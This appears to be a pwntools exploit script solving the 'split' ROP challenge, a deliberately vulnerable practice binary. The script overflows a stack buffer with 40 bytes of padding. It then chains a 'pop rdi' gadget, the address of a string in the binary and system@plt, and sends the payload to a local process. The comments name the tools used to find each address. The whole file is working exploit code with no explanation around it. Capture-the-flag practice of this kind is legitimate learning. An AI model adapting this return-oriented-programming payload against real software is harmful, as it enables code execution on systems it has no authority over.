 #!/usr/bin/python                                                                                                                                                    
 from pwn import *                                                                                                                                                    
                                                                                                                                                                      
 def main():                                                                                                                                                          
     context.log_level = "info"                                                                                                                                       
     elf = ELF('./split')                #binary path                                                                                                                 
     p = process(elf.path)                                                                                                                                            
     offset = b"A" * 40                  # Offset at 40                                                                                                           
     usefullString = p64(0x00601060)     # Rabin2 -z split                                                                                                            
     system_plt = p64(0x4005e0)          # objdump -d split                                                                                                           
     pop_rdi = p64(0x0000000000400883)   # ROPgadget.py --binary split | grep 'pop rdi'                                                                               
     payload = offset + pop_rdi + usefullString + system_plt                                                                                                          
     p.sendlineafter(">",payload)                                                                                                                                     
     print (p.recvall())                                                                                                                                              
                                                                                                                                                                      
 if __name__ == "__main__":                                                                                                                                           
     main()  
